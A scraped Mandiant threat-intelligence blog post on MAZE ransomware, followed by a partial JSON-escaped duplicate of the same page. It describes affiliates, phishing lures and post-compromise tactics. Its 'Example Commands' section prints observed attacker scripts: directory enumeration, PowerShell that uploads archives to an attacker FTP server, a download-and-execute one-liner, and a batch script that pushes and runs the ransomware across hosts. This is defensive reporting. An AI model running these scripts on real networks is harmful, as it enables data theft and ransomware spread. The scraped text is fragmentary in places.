8-5.33V18H4z"></path></svg></a></li></ul></div></div></div></div></div><div><section class="nRhiJb-DARUcf"><div class="nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-wNfPc-cGMI2b"><section class="DA9Qj nRhiJb-ObfsIf nRhiJb-fmcmS-oXtfBe"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-c5RTEf"></div><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c"><h5 class="cHE8Ub Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c">Mandiant </h5><p class="nRhiJb-qJTHM khCp7b"></p></div></section></div></section><div class="nRhiJb-DARUcf"><div class="nRhiJb-ObfsIf nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-qWD73c-cGMI2b"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re dzoHJ"></div><div class="OYL9D nRhiJb-kR0ZEf-OWXEXe-GV1x9e-OiUrBf" jsname="tx2NYc"><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Written by: Jeremy Kennelly, Kimberly Goody, Joshua Shilko</p>
<hr></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Targeted ransomware incidents have brought a threat of disruptive and destructive attacks to organizations across industries and geographies. FireEye <a href="https://cloud.google.com/security/products/threat-intelligence" rel="noopener" target="_blank">Mandiant Threat Intelligence</a> has previously documented this threat in our investigations of <a href="https://cloud.google.com/blog/topics/threat-intelligence/they-come-in-the-night-ransomware-deployment-trends" rel="noopener" target="_blank">trends across ransomware incidents</a>, <a href="https://cloud.google.com/blog/topics/threat-intelligence/pick-six-intercepting-a-fin6-intrusion" rel="noopener" target="_blank">FIN6 activity</a>, <a href="https://cloud.google.com/blog/topics/threat-intelligence/ransomware-against-machine-learning-to-disrupt-industrial-production" rel="noopener" target="_blank">implications for OT networks</a>, and other aspects of post-compromise ransomware deployment. Since November 2019, we’ve seen the MAZE ransomware being used in attacks that combine targeted ransomware use, public exposure of victim data, and an affiliate model.</p>
<p>Malicious actors have been actively deploying MAZE ransomware since at least May 2019. The ransomware was initially distributed via spam emails and exploit kits before later shifting to being deployed post-compromise. Multiple actors are involved in MAZE ransomware operations, based on our observations of alleged users in underground forums and distinct tactics, techniques, and procedures across Mandiant incident response engagements. Actors behind MAZE also maintain a public-facing website where they post data stolen from victims who refuse to pay an extortion fee.</p>
<p>The combination of these two damaging intrusion outcomes—dumping sensitive data and disrupting enterprise networks—with a criminal service makes MAZE a notable threat to many organizations. This blog post is based on information derived from numerous Mandiant incident response engagements and our own research into the MAZE ecosystem and operations.</p>
<p>Mandiant Threat Intelligence will be available to answer questions on the <a href="https://www.brighttalk.com/webcast/10469/408167" rel="noopener" target="_blank">MAZE ransomware threat in a May 21 webinar</a>.</p>
<h4>Victimology</h4>
<p>We are aware of more than 100 alleged MAZE victims reported by various media outlets and on the MAZE website since November 2019. These organizations have been primarily based in North America, although victims spanned nearly every geographical region. Nearly every industry sector including manufacturing, legal, financial services, construction, healthcare, technology, retail, and government has been impacted demonstrating that indiscriminate nature of these operations (Figure 1).</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze1_cped.max-1600x1600.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze1_cped.max-1600x1600.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze1_cped.max-1600x1600.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze1_cped.max-1600x1600.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 1: Geographical and industry distribution of alleged MAZE victims</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h4>Multiple Actors Involved in MAZE Ransomware Operations Identified</h4>
<p>Mandiant identified multiple Russian-speaking actors who claimed to use MAZE ransomware and were seeking partners to fulfill different functional roles within their teams. Additional information on these actors is available to <a href="https://www.mandiant.com/advantage/threat-intelligence/subscribe" rel="noopener" target="_blank">Mandiant Intelligence subscribers</a>. A panel used to manage victims targeted for MAZE ransomware deployment has a section for affiliate transactions. This activity is consistent with our assessment that MAZE operates under an affiliate model and is not distributed by a single group. Under this business model, ransomware developers will partner with other actors (i.e. affiliates) who are responsible for distributing the malware. In these scenarios, when a victim pays the ransom demand, the ransomware developers receive a commission. Direct affiliates of MAZE ransomware also partner with other actors who perform specific tasks for a percentage of the ransom payment. This includes partners who provide initial access to organizations and pentesters who are responsible for reconnaissance, privilege escalation and lateral movement—each of which who appear to work on a percentage-basis. Notably, in some cases, actors may be hired on a salary basis (vs commission) to perform specific tasks such as determining the victim organization and its annual revenues. This allows for specialization within the cyber criminal ecosystem, ultimately increasing efficiency, while still allowing all parties involved to profit.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze2_lpap.max-1000x1000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze2_lpap.max-1000x1000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze2_lpap.max-1000x1000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze2_lpap.max-1000x1000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 2: MAZE ransomware panel</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h4>MAZE Initially Distributed via Exploit Kits and Spam Campaigns</h4>
<p>MAZE ransomware was initially distributed directly via exploit kits and <a href="https://www.proofpoint.com/us/threat-insight/post/ta2101-plays-government-imposter-distribute-malware-german-italian-and-us" rel="noopener" target="_blank">spam campaigns</a> through late 2019. For example, in November 2019, Mandiant observed multiple email campaigns delivering Maze ransomware primarily to individuals at organizations in Germany and the United States, although a significant number of emails were also delivered to entities in Canada, Italy, and South Korea. These emails used tax, invoice, and package delivery themes with document attachments or inline links to documents which download and execute Maze ransomware.</p>
<p>On November 6 and 7, a Maze campaign targeting Germany delivered macro-laden documents using the subject lines “Wichtige informationen uber Steuerruckerstattung” and “1&amp;1 Internet AG - Ihre Rechnung 19340003422 vom 07.11.19” (Figure 3). Recipients included individuals at organizations in a wide range of industries, with the Financial Services, Healthcare, and Manufacturing sectors being targeted most frequently. These emails were sent using a number of malicious domains created with the registrant address gladkoff1991@yandex.ru.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze3_olbg.max-1000x1000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze3_olbg.max-1000x1000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze3_olbg.max-1000x1000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze3_olbg.max-1000x1000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 3: German-language lure</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>On November 8, a campaign delivered Maze primarily to Financial Services and Insurance organizations located in the United states. These emails originated from a compromised or spoofed account and contained an inline link to download a Maze executable payload.</p>
<p>On November 18 and 19, a Maze campaign targeted individuals operating in a range of industries in the United States and Canada with macro documents using phone bill and package delivery themes (Figure 4 and Figure 5). These emails used the subjects “Missed package delivery” and &quot;Your AT&amp;T wireless bill is ready to view&quot; and were sent using a number of malicious domains with the registrant address abusereceive@hitler.rocks. Notably, this registrant address was also used to create multiple Italian-language domains towards the end of November 2019.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 4: AT&amp;T email lure</p></span></div></section></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze5_spmy.max-1000x1000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze5_spmy.max-1000x1000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze5_spmy.max-1000x1000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/maze5_spmy.max-1000x1000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 5: Canada Post email lure</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h4>Shift to Post-Compromise Distribution Maximizes Impact</h4>
<p>Actors using MAZE have increasingly shifted to deploying the ransomware post-compromise. This methodology provides an opportunity to infect more hosts within a victim’s environment and exfiltrate data, which is leveraged to apply additional pressure on organizations to pay extortion fees. Notably, in at least some cases, the actors behind these operations charge an additional fee, in addition to the decryption key, for the non-release of stolen data.</p>
<p>Although the high-level intrusion scenarios preceding the distribution of MAZE ransomware are broadly similar, there have been notable variations across intrusions that suggest attribution to distinct teams. Even within these teams, the cyber criminals appear to be task-oriented meaning that one operator is not responsible for the full lifecycle. The following sections highlight the TTPs seen in a subset of incidents and serve to illustrate the divergence that may occur due to the fact that numerous, disparate actors are involved in different phases of these operations. Notably, the time between initial compromise to encryption has also been widely varied, from weeks to many months.</p>
<p><em>Initial Compromise</em></p>
<p>There are few clear patterns for intrusion vector across analyzed MAZE ransomware incidents. This is consistent with our observations of multiple actors who use MAZE soliciting partners with network access. The following are a sample of observations from several Mandiant incident response engagements:</p>
<ul>
<li>A user downloaded a malicious resume-themed Microsoft Word document that contained macros which launched an IcedID payload, which was ultimately used to execute an instance of BEACON.</li>
<li>An actor logged into an internet-facing system via RDP. The account used to grant initial access was a generic support account. It is unclear how the actor obtained the account's password.</li>
<li>An actor exploited a misconfiguration on an Internet-facing system. This access enabled the actor to deploy tools to pivot into the internal network.</li>
<li>An actor logged into a Citrix web portal account with a weak password. This authenticated access enabled the actor to launch a Meterpreter payload on an internal system.</li>
</ul>
<p><em>Establish Foothold &amp; Maintain Presence</em></p>
<p>The use of legitimate credentials and broad distribution of BEACON across victim environments appear to be consistent approaches used by actors to establish their foothold in victim networks and to maintain presence as they look to meet their ultimate objective of deploying MAZE ransomware. Despite these commonplace behaviors, we have observed an actor create their own domain account to enable latter-stage operations.</p>
<ul>
<li>Across multiple incidents, threat actors deploying MAZE established a foothold in victim environments by installing BEACON payloads on many servers and workstations.</li>
<li>Web shells were deployed to an internet-facing system. The system level access granted by these web shells was used to enable initial privilege escalation and the execution of a backdoor.</li>
<li>Intrusion operators regularly obtained and maintained access to multiple domain and local system accounts with varying permissions that were used throughout their operations.</li>
<li>An actor created a new domain account and added it to the domain administrators group.</li>
</ul>
<p><em>Escalate Privileges</em></p>
<p>Although Mandiant has observed multiple cases where MAZE intrusion operators employed Mimikatz to collect credentials to enable privilege escalation, these efforts have also been bolstered in multiple cases via use of Bloodhound, and more manual searches for files containing credentials.</p>
<ul>
<li>Less than two weeks after initial access, the actor downloaded and interacted with an archive named <em>mimi.zip</em>, which contained files corresponding to the credential harvesting tool Mimikatz. In the following days the same <em>mimi.zip</em> archive was identified on two domain controllers in the impacted environment.</li>
<li>The actor attempted to find files with the word “password” within the environment. Additionally, several archive files were also created with file names suggestive of credential harvesting activity.</li>
<li>The actor attempted to identify hosts running the KeePass password safe software.</li>
<li>Across multiple incidents, the Bloodhound utility was used, presumably to assess possible methods of obtaining credentials with domain administrator privileges.</li>
<li>Actors primarily used Procdump and Mimikatz to collect credentials used to enable later stages of their intrusion. Notably, both Bloodhound and PingCastle were also used, presumably to enable attackers' efforts to understand the impacted organization's Active Directory configuration. In this case the responsible actors also attempted to exfiltrate collected credentials to multiple different cloud file storage services.</li>
</ul>
<p><em>Reconnaissance</em></p>
<p>Mandiant has observed a broad range of approaches to network, host, data, and Active Directory reconnaissance across observed MAZE incidents. The varied tools and approaches across these incidents maybe best highlights the divergent ways in which the responsible actors interact with victim networks.</p>
<ul>
<li>In some intrusions, reconnaissance activity occurred within three days of gaining initial access to the victim network. The responsible actor executed a large number of reconnaissance scripts via Cobalt Strike to collect network, host, filesystem, and domain related information.</li>
<li>Multiple built-in Windows commands were used to enable network, account, and host reconnaissance of the impacted environment, though the actors also supplied and used Advanced IP Scanner and Adfind to support this stage of their operations.</li>
<li>Preliminary network reconnaissance has been conducted using a batch script named '2.bat' which contained a series of nslookup commands. The output of this script was copied into a file named '2.txt'.</li>
<li>The actor exfiltrated reconnaissance command output data and documents related to the IT environment to an attacker-controlled FTP server via an encoded PowerShell script.</li>
<li>Over a period of several days, an actor conducted reconnaissance activity using Bloodhound, PowerSploit/PowerView (Invoke-ShareFinder), and a reconnaissance script designed to enumerate directories across internal hosts.</li>
<li>An actor employed the adfind tool and a batch script to collect information about their network, hosts, domain, and users. The output from this batch script (2adfind.bat) was saved into an archive named 'ad.7z' using an instance of the 7zip archiving utility named <em>7.exe</em>.</li>
<li>An actor used the tool <em>smbtools.exe </em>to assess whether accounts could login to systems across the environment.</li>
<li>An actor collected directory listings from file servers across an impacted environment. Evidence of data exfiltration was observed approximately one month later, suggesting that the creation of these directory listings may have been precursor activity, providing the actors with data they may have used to identify sensitive data for future exfiltration.</li>
</ul>
<p><em>Lateral Movement</em></p>
<p>Across the majority of MAZE ransomware incidents lateral movement was accomplished via Cobalt Strike BEACON and using previously harvested credentials. Despite this uniformity, some alternative tools and approaches were also observed.</p>
<ul>
<li>Attackers relied heavily on Cobalt Strike BEACON to move laterally across the impacted environment, though they also tunneled RDP using the ngrok utility, and employed tscon to hijack legitimate rdp sessions to enable both lateral movement and privilege escalation.</li>
<li>The actor moved laterally throughout some networks leveraging compromised service and user accounts obtained from the system on which they gained their initial foothold. This allowed them to obtain immediate access to additional systems. Stolen credentials were then used to move laterally across the network via RDP and to install BEACON payloads providing the actors with access to nearly one hundred hosts.</li>
<li>An actor moved laterally using Metasploit and later deployed a Cobalt Strike payload to a system using a local administrator account.</li>
<li>At least one actor attempted to perform lateral movement using EternalBlue in early and late 2019; however, there is no evidence that these attempts were successful.</li>
</ul>
<p><em>Complete Mission</em></p>
<p>There was evidence suggesting data exfiltration across most analyzed MAZE ransomware incidents. While malicious actors could monetize stolen data in various way (e.g. sale in an underground forum, fraud), actors employing MAZE are known to threaten the release of stolen data if victim organizations do not pay an extortion fee.</p>
<ul>
<li>An actor has been observed exfiltrating data to FTP servers using a base64-encoded PowerShell script designed to upload any files with .7z file extensions to a predefined FTP server using a hard-coded username and password. This script appears to be a slight variant of a script first posted to Microsoft TechNet in 2013.</li>
<li>A different base64-encoded PowerShell command was also used to enable this functionality in a separate incident.</li>
<li>Actors deploying MAZE ransomware have also used the utility WinSCP to exfiltrate data to an attacker-controlled FTP server.</li>
<li>An actor has been observed employing a file replication utility and copying the stolen data to a cloud file hosting/sharing service.</li>
<li>Prior to deploying MAZE ransomware threat actors employed the 7zip utility to archive data from across various corporate file shares. These archives were then exfiltrated to an attacker-controlled server via FTP using the WinSCP utility.</li>
</ul>
<p>In addition to data theft, actors deploy MAZE ransomware to encrypt files identified on the victim network. Notably, the aforementioned MAZE panel has an option to specify the date on which ransom demands will double, likely to create a sense of urgency to their demands.</p>
<ul>
<li>Five days after data was exfiltrated from a victim environment the actor copied a MAZE ransomware binary to 15 hosts within the victim environment and successfully executed it on a portion of these systems.</li>
<li>Attackers employed batch scripts and a series to txt files containing host names to distribute and execute MAZE ransomware on many servers and workstations across the victim environment.</li>
<li>An actor deployed MAZE ransomware to tens of hosts, explicitly logging into each system using a domain administrator account created earlier in the intrusion.</li>
<li>Immediately following the exfiltration of sensitive data, the actors began deployment of MAZE ransomware to hosts across the network. In some cases, thousands of hosts were ultimately encrypted. The encryption process proceeded as follows:
<ul>
<li>A batch script named <em>start.bat</em> was used to execute a series of secondary batch scripts with names such as <em>xaa3x.bat</em> or <em>xab3x.bat</em>.</li>
<li>Each of these batch scripts contained a series of commands that employed the copy command, WMIC, and PsExec to copy and execute a kill script (windows.bat) and an instance of MAZE ransomware (sss.exe) on hosts across the impacted environment</li>
<li>Notably, forensic analysis of the impacted environment revealed MAZE deployment scripts targeting ten times as many hosts as were ultimately encrypted.</li>
</ul>
</li>
</ul>
<h4>Implications</h4>
<p>Based on our belief that the MAZE ransomware is distributed by multiple actors, we anticipate that the TTPs used throughout incidents associated with this ransomware will continue to vary somewhat, particularly in terms of the initial intrusion vector. For more comprehensive recommendations for addressing ransomware, please refer to our <a href="https://www.mandiant.com/resources/ransomware-protection-and-containment-strategies" rel="noopener" target="_blank">Ransomware Protection and Containment Strategies</a> blog post and the linked white paper.</p>

<h4>MITRE ATT&amp;CK Mappings</h4>
<p>Mandiant currently tracks three separate clusters of activity involved in the post-compromise distribution of MAZE ransomware. Future data collection and analysis efforts may reveal additional groups involved in intrusion activity supporting MAZE operations, or may instead allow us to collapse some of these groups into larger clusters. It should also be noted that ‘initial access’ phase techniques have been included in these mappings, though in some cases this access may have been provided by a separate threat actor(s).</p>
<h4>MAZE Group 1 MITRE ATT&amp;CK Mapping</h4>
<p> </p>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">

<td style="border:1px solid #000000;padding:16px">T1078: Valid Accounts</td>

<h4>Example Commands Observed in MAZE Ransomware Incidents</h4>
<pre><code>function Enum-UsersFolders($PathEnum)
{
    $foldersArr = 'Desktop','Downloads','Documents','AppData/Roaming','AppData/Local'
    Get-ChildItem -Path $PathEnum'/c$' -ErrorAction SilentlyContinue
    Get-ChildItem -Path $PathEnum'/c$/Program Files' -ErrorAction SilentlyContinue
    Get-ChildItem -Path $PathEnum'/c$/Program Files (x86)' -ErrorAction SilentlyContinue
    foreach($Directory in Get-ChildItem -Path $PathEnum'/c$/Users' -ErrorAction SilentlyContinue) {
        foreach($SeachDir in $foldersArr) {
            Get-ChildItem -Path $PathEnum'/c$/Users/'$Directory'/'$SeachDir -ErrorAction SilentlyContinue
        }
    }
}</code></pre>
<p>PowerShell reconnaissance script used to enumerate directories</p>
<p> </p>
<pre><code>$Dir=&quot;C:/Windows/Temp/&quot;
#ftp server
$ftp = &quot;ftp://&lt;IP Address&gt;/incoming/&quot;
$user = &quot;&lt;username&gt;&quot;
$pass = &quot;&lt;password&gt;&quot;
$webclient = New-Object System.Net.WebClient
$webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)
#list every sql server trace file
foreach($item in (dir $Dir &quot;*.7z&quot;)){
   &quot;Uploading $item...&quot;
   $uri = New-Object System.Uri($ftp+$item.Name)
   $webclient.UploadFile($uri, $item.FullName)
}</code></pre>
<p>Decoded FTP upload PowerShell script</p>
<p> </p>
<pre><code>powershell -nop -exec bypass IEX (New-Object Net.Webclient).DownloadString(&#39;http://127.0.0.1:43984/&#39;); Add-FtpFile -ftpFilePath &quot;ftp://&lt;IP  Address&gt;/cobalt_uploads/&lt;file name&gt;&quot; -localFile &quot;&lt;local file path&gt;\ &lt;file name&gt; &quot; -userName &quot;&lt;username&gt;&quot; -password &quot;&lt;password&gt;&quot;</code></pre>

c:\windows\temp\sss.exe</code></pre>

<p>Example commands from MAZE distribution scripts</p>
<p> </p>
<pre><code>@echo off
del done.txt
del offline.txt
rem Loop thru list of computer names in file specified on command-line
for /f %%i in (%1) do call :check_machine %%i
goto end
:check_machine
rem Check to see if machine is up.
ping -n 1 %1|Find &quot;TTL=&quot; &gt;NUL 2&gt;NUL
if errorlevel 1 goto down
echo %1
START cmd /c &quot;copy [Location of MAZE binary] \\%1\c$\windows\temp &amp;&amp; exit&quot;
timeout 1 &gt; NUL
echo %1 &gt;&gt; done.txt
rem wmic /node:&quot;%1&quot; process call create &quot;regsvr32.exe /i C:\windows\temp\[MAZE binary name]&quot; &gt;&gt; done.txt
START &quot;&quot; cmd /c &quot;wmic /node:&quot;%1&quot; process call create &quot;regsvr32.exe /i C:\windows\temp\[MAZE binary name]&quot; &amp;&amp; exit&quot;
goto end
:down
  rem Report machine down
  echo %1 &gt;&gt; offline.txt
:end</code></pre>

Incidents"],null,null,[[null,null,[null,[null,"\u003cp\u003eWritten by: Jeremy Kennelly, Kimberly Goody, Joshua Shilko\u003c/p\u003e\n\u003chr\u003e"]]],[null,null,[null,[null,"\u003cp\u003eTargeted ransomware incidents have brought a threat of disruptive and destructive attacks to organizations across industries and geographies. FireEye \u003ca href\u003d\"https://cloud.google.com/security/products/threat-intelligence\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eMandiant Threat Intelligence\u003c/a\u003e has previously documented this threat in our investigations of \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/they-come-in-the-night-ransomware-deployment-trends\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003etrends across ransomware incidents\u003c/a\u003e, \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/pick-six-intercepting-a-fin6-intrusion\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eFIN6 activity\u003c/a\u003e, \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/ransomware-against-machine-learning-to-disrupt-industrial-production\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eimplications for OT networks\u003c/a\u003e, and other aspects of post-compromise ransomware deployment. Since November 2019, we’ve seen the MAZE ransomware being used in attacks that combine targeted ransomware use, public exposure of victim data, and an affiliate model.\u003c/p\u003e\n\u003cp\u003eMalicious actors have been actively deploying MAZE ransomware since at least May 2019. The ransomware was initially distributed via spam emails and exploit kits before later shifting to being deployed post-compromise. Multiple actors are involved in MAZE ransomware operations, based on our observations of alleged users in underground forums and distinct tactics, techniques, and procedures across Mandiant incident response engagements. Actors behind MAZE also maintain a public-facing website where they post data stolen from victims who refuse to pay an extortion fee.\u003c/p\u003e\n\u003cp\u003eThe combination of these two damaging intrusion outcomes—dumping sensitive data and disrupting enterprise networks—with a criminal service makes MAZE a notable threat to many organizations. This blog post is based on information derived from numerous Mandiant incident response engagements and our own research into the MAZE ecosystem and operations.\u003c/p\u003e\n\u003cp\u003eMandiant Threat Intelligence will be available to answer questions on the \u003ca href\u003d\"https://www.brighttalk.com/webcast/10469/408167\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eMAZE ransomware threat in a May 21 webinar\u003c/a\u003e.\u003c/p\u003e\n\u003ch4\u003eVictimology\u003c/h4\u003e\n\u003cp\u003eWe are aware of more than 100 alleged MAZE victims reported by various media outlets and on the MAZE website since November 2019. These organizations have been primarily based in North America, although victims spanned nearly every geographical region. Nearly every industry sector including manufacturing, legal, financial services, construction, healthcare, technology, retail, and government has been impacted demonstrating that indiscriminate nature of these operations (Figure 1).\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 1: Geographical and industry distribution of alleged MAZE victims\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/maze1_cped.max-1600x1600.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/maze1_cped.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/maze1_cped.max-1600x1600.png 1501w"," 1060px,  1501px","https://storage.googleapis.com/gweb-cloudblog-publish/images/maze1_cped.max-1600x1600.png"],null,3]]],[null,null,[null,[null,"\u003ch4\u003eMultiple Actors Involved in MAZE Ransomware Operations Identified\u003c/h4\u003e\n\u003cp\u003eMandiant identified multiple Russian-speaking actors who claimed to use MAZE ransomware and were seeking partners to fulfill different functional roles within their teams. Additional information on these actors is available to \u003ca href\u003d\"https://www.mandiant.com/advantage/threat-intelligence/subscribe\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eMandiant Intelligence subscribers\u003c/a\u003e. A panel used to manage victims targeted for MAZE ransomware deployment has a section for affiliate transactions. This activity is consistent with our assessment that MAZE operates under an affiliate model and is not distributed by a single group. Under this business model, ransomware developers will partner with other actors (i.e. affiliates) who are responsible for distributing the malware. In these scenarios, when a victim pays the ransom demand, the ransomware developers receive a commission. Direct affiliates of MAZE ransomware also partner with other actors who perform specific tasks for a percentage of the ransom payment. This includes partners who provide initial access to organizations and pentesters who are responsible for reconnaissance, privilege escalation and lateral movement—each of which who appear to work on a percentage-basis. Notably, in some cases, actors may be hired on a salary basis (vs commission) to perform specific tasks such as determining the victim organization and its annual revenues. This allows for specialization within the cyber criminal ecosystem, ultimately increasing efficiency, while still allowing all parties involved to profit.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 2: MAZE ransomware panel\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/maze2_lpap.max-1000x1000.png",null,null,"https://storage.googleapis.com/gweb-cloudblog-publish/images/maze2_lpap.max-1000x1000.png"],null,3]]],[null,null,[null,[null,"\u003ch4\u003eMAZE Initially Distributed via Exploit Kits and Spam Campaigns\u003c/h4\u003e\n\u003cp\u003eMAZE ransomware was initially distributed directly via exploit kits and \u003ca href\u003d\"https://www.proofpoint.com/us/threat-insight/post/ta2101-plays-government-imposter-distribute-malware-german-italian-and-us\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003espam campaigns\u003c/a\u003e through late 2019. For example, in November 2019, Mandiant observed multiple email campaigns delivering Maze ransomware primarily to individuals at organizations in Germany and the United States, although a significant number of emails were also delivered to entities in Canada, Italy, and South Korea. These emails used tax, invoice, and package delivery themes with document attachments or inline links to documents which download and execute Maze ransomware.\u003c/p\u003e\n\u003cp\u003eOn November 6 and 7, a Maze campaign targeting Germany delivered macro-laden documents using the subject lines “Wichtige informationen uber Steuerruckerstattung” and “1\u0026amp;1 Internet AG - Ihre Rechnung 19340003422 vom 07.11.19” (Figure 3). Recipients included individuals 